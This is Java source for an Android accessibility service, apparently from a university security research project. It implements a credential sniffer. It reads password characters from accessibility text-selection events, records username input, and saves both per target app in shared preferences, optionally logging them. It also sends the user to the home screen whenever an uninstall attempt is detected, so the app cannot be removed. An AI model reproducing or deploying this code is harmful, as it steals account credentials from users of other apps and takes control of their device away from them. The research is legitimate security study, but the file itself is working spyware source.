package de.fau.i1.aka.avt.Accessibility;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.util.HashSet;
import java.util.List;
import java.util.Objects;

import de.fau.i1.aka.avt.R;
import de.fau.i1.aka.avt.Services.AccessibilityServiceSM;

import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.PREFS_SNIFFED_PACKAGE_NAMES;
import static de.fau.i1.aka.avt.Services.AccessibilityServiceSM.debug;

/**
 * Created by Anatoli Kalysch (anatoli.kalysch@fau.de), Department of Computer Science, Friedrich-Alexander University Erlangen-Nuremberg, on 13.11.17.
 */

class AccessibilityStateWatcher extends AccessibilityState {
    private final static Character DOT = '•'; // '\u2022'
    private final static String ACCESSIBILITY_SNIFF_TAG = "AccessibilitySniff";


    private AccessibilityStateEnum selfState = AccessibilityStateEnum.WATCHER;

    // passive sniffing
    private Character[] passwordBuffer = resetBuffer();
    private Character[] usernameBuffer = resetBuffer();
    private String passPackageName;


    private Character[] resetBuffer() {
        Character[] buffer = new Character[64];
        for (int i = 0; i < 64; i++) {
            buffer[i] = null;
        }
        return buffer;
    }

    public AccessibilityStateWatcher(AccessibilityServiceSM accessibilityServiceSM) {
        super(accessibilityServiceSM);
    }

    /**
     * This method subsumes the protection measure of our service. If the user tries to uninstall the
     * application by dragging it to the "uninstall" symbol on the home screen simply stop the event.
     * @param event - the accessibility event
     */
    @Override
    protected void viewSelected(AccessibilityEvent event) {
        // disallow user from uninstalling our app via drag and drop from launcher
        String eventText = String.valueOf(event.getText());
        if (eventText.toLowerCase().contains("uninstall")) {
            dispatchHomeScreenIntent();
        }
    }

    /**
     * This method subsumes one of the protection measure of our service. If settings is called and
     * our app is to be uninstalled just send the user back to the home screen.
     * @param event - the accessibility event
     */
    @Override
    protected void windowStateChanged(AccessibilityEvent event) {
        CharSequence packageName = event.getPackageName();
        AccessibilityNodeInfo source = event.getSource();

        if (source == null) {
            return;
        }

        // disallow the user from uninstalling our app via settings
//        List<AccessibilityNodeInfo> s_m = source.findAccessibilityNodeInfosByText(context.getString(R.string.app_name));
//        List<AccessibilityNodeInfo> appInfo = source.findAccessibilityNodeInfosByText(context.getString(R.string.appInfo));
//        List<AccessibilityNodeInfo> uninstall = source.findAccessibilityNodeInfosByText(context.getString(R.string.uninstall));
//        if ((s_m.size() > 0
//                        && appInfo.size() > 0
//                        && uninstall.size() > 0
//                        && String.valueOf(packageName).toLowerCase().contains("settings"))) {
//            dispatchHomeScreenIntent();
//        }

        checkPasswordBuffer();

//        findAndClickByText(source, "start now");


        source.recycle();
    }


    /**
     * This is the main sniffing logic. Depending on the EditText type that generated the event either
     * the password or the username array is updated. The plain text character is extracted and put
     * into the according array field with the same index.
     * @param event - the accessibility event
     */
    @Override
    protected void viewTextSelectionChanged(AccessibilityEvent event) {
        String eventText = String.valueOf(event.getText());
        eventText = eventText.substring(1, eventText.length()-1);
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) {
            return;
        }

        if (source.isPassword()) {
            passPackageName = String.valueOf(event.getPackageName());

            for (int i = 0; i < eventText.length(); i++) {
                if (!Objects.equals(DOT, eventText.charAt(i))) {
                    passwordBuffer[i] = eventText.charAt(i);
                }
            }

            Toast.makeText(context, buildStringfromChararray(passwordBuffer), Toast.LENGTH_SHORT).show();

        } else {
            if (source.isEditable()) {
                for (int i = 0; i < eventText.length(); i++) {
                    usernameBuffer[i] = eventText.charAt(i);
                }
                Toast.makeText(context, buildStringfromChararray(usernameBuffer), Toast.LENGTH_SHORT).show();

            } else {
                Toast.makeText(context, eventText, Toast.LENGTH_SHORT).show();

            }

        }

        source.recycle();
    }


    @Override
    protected void viewClicked(AccessibilityEvent event) {
        checkPasswordBuffer();
    }

    /**
     * If the passwordBuffer is not empty this will save the sniffed credentials. If debug has been
     * enabled in the AccessibilityServiceSM class then the credentials will also be logged to logcat.
     *
     * Note: The credential sniffig implemented here assumes users to input their username first and
     * the password second (e.g. facebook, netflix) or no username at all (e.g. paypal).
     */
    private void checkPasswordBuffer() {
        if (passwordBuffer[0] != null) {
            HashSet<String> sniffedPackageNames = (HashSet<String>) context.queryPreferences().getStringSet(PREFS_SNIFFED_PACKAGE_NAMES, null);
            if (sniffedPackageNames == null) sniffedPackageNames = new HashSet<>();

            String pass = buildStringfromChararray(passwordBuffer);
            passwordBuffer = resetBuffer();
            String user = buildStringfromChararray(usernameBuffer);
            usernameBuffer = resetBuffer();


            if (context.queryPreferences().getString(passPackageName + "user", null) == null)
                context.queryPreferences().edit().putString(passPackageName + "user", user).apply();
            if (context.queryPreferences().getString(passPackageName + "pass", null) == null)
                context.queryPreferences().edit().putString(passPackageName + "pass", pass).apply();

            sniffedPackageNames.add(passPackageName);
            if (debug) Log.v(ACCESSIBILITY_SNIFF_TAG, passPackageName + ":" + user);
            if (debug) Log.v(ACCESSIBILITY_SNIFF_TAG, passPackageName + ":" + pass);
            context.queryPreferences().edit().putStringSet(PREFS_SNIFFED_PACKAGE_NAMES, sniffedPackageNames).apply();
        }
    }

    /**
     * Build a String from a Character array.
     */
    private String buildStringfromChararray(Character[] chars) {
        StringBuilder sb = new StringBuilder();
        for (Character s : chars) {
            if (s == null) break;
            sb.append(s);
        }
        return sb.toString();
    }


    @Override
    protected AccessibilityStateEnum getNextState() {
        // change selfState in the AccessibilityEvent handling methods
        return AccessibilityStateEnum.WATCHER;
    }
}
